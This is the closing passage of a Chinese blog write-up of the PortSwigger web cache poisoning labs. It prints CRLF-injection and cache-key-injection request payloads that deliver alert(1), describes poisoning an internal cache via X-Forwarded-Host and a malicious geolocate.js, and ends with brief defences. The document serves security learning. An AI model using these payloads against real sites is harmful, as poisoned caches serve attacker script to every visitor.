Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li><p>这里的 Payload 构造是有一定难度的，首先是 CRLF 注入，CR 为回车符，LF 为换行符，CRLF 相当于进行换行的操作，这样可以让我们在一个 HTTP Header 字段中注入多个参数。<code>%20</code> 为空格，<code>%0a</code> 为换行。</p>
</li>
<li><p>接着，我们在 Origin 字段当中实现我们的 XSS 攻击，为了能将请求的内容注入到响应中，我们需要开启 CORS，即将 cors&#x3D;0 改为 cors&#x3D;1</p>
</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/KeyedInjection.png" class="">

<p>下一步我们构造 &#x2F;login 处的 payload</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;login?lang&#x3D;en?utm_content&#x3D;x%26cors&#x3D;1%26x&#x3D;1$$Origin&#x3D;x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为我们已经利用 &#x2F;js&#x2F;localize.js 构造 Web 缓存，那么在 &#x2F;login 的 URL 里面直接构造这样的 payload 会被缓存识别为等效页面而投放中毒缓存。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/KeyInjectionSolved.png" class="">

<h3 id="9-内部缓存投毒"><a href="#9-内部缓存投毒" class="headerlink" title="9. 内部缓存投毒"></a>9. 内部缓存投毒</h3><p>有点 CSRF 的味道吧，和之前的攻击方法很像，这里就不展开讲了。不同之处在于，因为是缓存键的问题，我们不需要先找一个不被键入的参数。也就是不需要尝试 <code>?Cb=1234</code> 那种先行测试方式了。</p>
<p>但是从攻击的角度来说很类似于 XXE 中的复用本地 DTD 的意思。</p>
<blockquote>
<h5 id="Lab-Internal-cache-poisoning"><a href="#Lab-Internal-cache-poisoning" class="headerlink" title="Lab: Internal cache poisoning"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal">Lab: Internal cache poisoning</a></h5></blockquote>
<p>先用 Param Miner 扫一下，探测结果是 <code>X-Forwarded-Host</code> 字段可用。</p>
<p>尝试输入 <code>X-Forwarded-Host: 123</code> 发现每次发包都会有地方变成 <code>123</code>，看来可控的地方非常之多啊 ~</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/HerfControl.png" class="">

<p>因为每一次加载页面，都会自动加载 <code>/js/geolocate.js</code> 文件，于是我们在 Exploit Server 中构造 <code>/js/geolocate.js</code> 的恶意 Payload。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/LastPayload.png" class="">

<p>多发几次包，使得可控的地方全部变成我们的恶意 Payload</p>
<h2 id="0x06-Web-Cache-投毒的防御"><a href="#0x06-Web-Cache-投毒的防御" class="headerlink" title="0x06 Web Cache 投毒的防御"></a>0x06 Web Cache 投毒的防御</h2><p><strong>1)</strong> Web 缓存投毒漏洞非常隐蔽，决定开启缓存功能的应用程序一定要进行严格的安全防护，尽量使用静态响应及对导入的资源进行校验。尽可能修复客户端漏洞以防止被进一步利用。</p>
<p><strong>(2)</strong> 应禁止模棱两可的请求方法，如 fat Get 方法。应尽可能禁用不需要的一切 HTTP 头字段，无论多罕见。</p>
<h2 id="0x07-小结一下"><a href="#0x07-小结一下" class="headerlink" title="0x07 小结一下"></a>0x07 小结一下</h2><p>Web Cache 投毒攻击还是那句话，危害高于 CORS，低于 CSRF，它更是一种扩大战果的工具，最近学习 Web Cache 还是有点耗费精力。</p>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">PortSwigger-WebCache中毒漏洞学习</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2022-04-28 21:17:50</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2022/04/28/PortSwigger-WebCache中毒漏洞学习/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2022/05/05/Burpsuite%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">Burpsuite使用中的踩坑合集</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2022/04/24/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-06-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">WebGoat代码审计-06-有缺陷的访问控制</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;评论
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
              appKey: 'ermlV1eoB1YODT088EdXjo6C',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'just go go',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return '博主'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'Drunkbaby'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PortSwigger-WebCache-Poisoning-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="nav-text">PortSwigger-WebCache Poisoning 漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%A6%82%E5%BF%B5%E6%98%8E%E6%99%B0"><span class="nav-text">0x02 概念明晰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-Web-Cache"><span class="nav-text">1. 什么是 Web Cache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%A6%82%E4%BD%95%E5%9C%A8-Web-Cache-%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%9F%BA%E7%A1%80%E4%B8%8A%E8%BF%9B%E8%A1%8C-Poison%EF%BC%9F"><span class="nav-text">2. 如何在 Web Cache 运行流程的基础上进行 Poison？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Cache-Key-%E7%BC%93%E5%AD%98%E9%94%AE"><span class="nav-text">3. Cache Key:缓存键</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AF%B9%E4%BA%8E-Web-Cache-%E8%BF%9B%E8%A1%8C%E6%8A%95%E6%AF%92"><span class="nav-text">0x03 对于 Web Cache 进行投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Cache-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">Web Cache 的危害</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BF%9B%E8%A1%8C-Web-Cache-Poisoning-%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-text">1. 进行 Web Cache Poisoning 的思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%89%BE%E5%87%BA%E6%9C%AA%E8%A2%AB-Web-Cache-%E8%BF%9B%E8%A1%8C%E7%BC%93%E5%AD%98%E7%9A%84%E8%BE%93%E5%85%A5"><span class="nav-text">一、找出未被 Web Cache 进行缓存的输入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BB%8E%E5%90%8E%E7%AB%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B1%E5%8F%91%E8%A2%AB%E6%8A%95%E6%AF%92%E7%9A%84%E5%93%8D%E5%BA%94"><span class="nav-text">二、从后端服务器诱发被投毒的响应</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%BE%97%E5%88%B0%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E5%93%8D%E5%BA%94"><span class="nav-text">三、得到被缓存的响应</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%9F%BA%E4%BA%8E%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E7%9A%84-Web-Cache-Poisoning-%E6%94%BB%E5%87%BB"><span class="nav-text">0x04 基于缓存设计缺陷的 Web Cache Poisoning 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8-Web-Cache-Poisoning-%E6%89%A9%E5%A4%A7-XSS-%E6%88%98%E6%9E%9C"><span class="nav-text">1. 使用 Web Cache Poisoning 扩大 XSS 战果</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-with-an-unkeyed-header"><span class="nav-text">Lab: Web cache poisoning with an unkeyed header</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%B9%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84-Cookie-%E8%BF%9B%E8%A1%8C%E6%8A%95%E6%AF%92"><span class="nav-text">2. 对不被缓存的 Cookie 进行投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-with-an-unkeyed-cookie"><span class="nav-text">Lab: Web cache poisoning with an unkeyed cookie</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8%E5%A4%9A%E4%B8%AA-HTTP-Header-%E5%8F%91%E8%B5%B7-Web-Cache-%E6%8A%95%E6%AF%92"><span class="nav-text">3. 使用多个 HTTP Header 发起 Web Cache 投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-with-multiple-headers"><span class="nav-text">Lab: Web cache poisoning with multiple headers</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E9%80%9A%E8%BF%87-Cache-Control-%E5%AF%BC%E8%87%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">4. 通过 Cache-Control 导致信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Cache-Control"><span class="nav-text">Cache-Control</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Vary-Header"><span class="nav-text">Vary Header</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Targeted-web-cache-poisoning-using-an-unknown-header"><span class="nav-text">Lab: Targeted web cache poisoning using an unknown header</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AF%B9-DOM-%E5%9E%8B%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C-Web-Cache-%E6%8A%95%E6%AF%92"><span class="nav-text">5. 对 DOM 型漏洞进行 Web Cache 投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-to-exploit-a-DOM-vulnerability-via-a-cache-with-strict-cacheability-criteria"><span class="nav-text">Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Web-Cache-%E5%AE%8C%E6%95%B4%E6%8A%95%E6%AF%92%E8%BF%87%E7%A8%8B%E5%AD%A6%E4%B9%A0"><span class="nav-text">6. Web Cache 完整投毒过程学习</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Combining-web-cache-poisoning-vulnerabilities"><span class="nav-text">Lab: Combining web cache poisoning vulnerabilities</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%9F%BA%E4%BA%8E-Cache-Key-%E7%BC%BA%E9%99%B7%E7%9A%84-Web-Cache-%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB"><span class="nav-text">0x05 基于 Cache Key 缺陷的 Web Cache 投毒攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-Cache-Key-%E7%BC%BA%E9%99%B7%E7%9A%84-Web-Cache-%E6%8A%95%E6%AF%92%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-text">基于 Cache Key 缺陷的 Web Cache 投毒的基本步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E8%BE%A8%E8%AE%A4%E6%8E%A5%E6%94%B6%E5%88%B0%E7%9A%84%E5%93%8D%E5%BA%94%E6%98%AF%E6%9D%A5%E8%87%AA%E7%BC%93%E5%AD%98%E8%BF%98%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">1. 辨认接收到的响应是来自缓存还是服务器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%A7%82%E5%AF%9F%E7%BC%93%E5%AD%98%E5%AF%B9%E7%BC%93%E5%AD%98%E9%94%AE%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E7%9A%84%E5%A4%84%E7%90%86"><span class="nav-text">2. 观察缓存对缓存键是否有其他的处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">3. 进行漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87%E6%9C%AA%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="nav-text">1. 通过未被缓存的端口进行攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87%E6%9C%AA%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB"><span class="nav-text">2. 通过未被缓存的查询字符串攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">探测不被缓存的查询字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-of-%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">Exploit of 不被缓存的查询字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-via-an-unkeyed-query-string"><span class="nav-text">Lab: Web cache poisoning via an unkeyed query string)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BB%85%E6%9C%89%E5%87%A0%E4%B8%AA%E4%B8%8D%E8%A2%AB%E7%BC%93%E5%AD%98%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%E6%97%B6"><span class="nav-text">3. 仅有几个不被缓存的查询参数时</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-via-an-unkeyed-query-parameter"><span class="nav-text">Lab: Web cache poisoning via an unkeyed query parameter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8%E5%A4%9A%E4%B8%AA%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0%E7%BC%93%E5%AD%98%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F"><span class="nav-text">4. 利用多个参数实现缓存参数隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Parameter-cloaking"><span class="nav-text">Lab: Parameter cloaking</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%88%A9%E7%94%A8-Fat-GET-%E8%AF%B7%E6%B1%82%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="nav-text">5. 利用 Fat GET 请求发起攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Web-cache-poisoning-via-a-fat-GET-request"><span class="nav-text">Lab: Web cache poisoning via a fat GET request</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E8%B5%84%E6%BA%90%E5%AF%BC%E5%85%A5%E4%B8%AD%E7%9A%84%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="nav-text">6. 利用资源导入中的动态内容进行攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E7%BC%93%E5%AD%98%E8%A7%A3%E6%9E%90-URL-%E7%BC%96%E7%A0%81%E7%9A%84%E9%9A%90%E6%82%A3"><span class="nav-text">7. 缓存解析 URL 编码的隐患</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-URL-normalization"><span class="nav-text">Lab: URL normalization</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E7%BC%93%E5%AD%98%E9%94%AE%E6%B3%A8%E5%85%A5"><span class="nav-text">8. 缓存键注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Cache-key-injection"><span class="nav-text">Lab: Cache key injection)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E5%86%85%E9%83%A8%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="nav-text">9. 内部缓存投毒</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Internal-cache-poisoning"><span class="nav-text">Lab: Internal cache poisoning</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Web-Cache-%E6%8A%95%E6%AF%92%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-text">0x06 Web Cache 投毒的防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="nav-text">0x07 小结一下</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2021</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">Drunkbaby</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>




<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
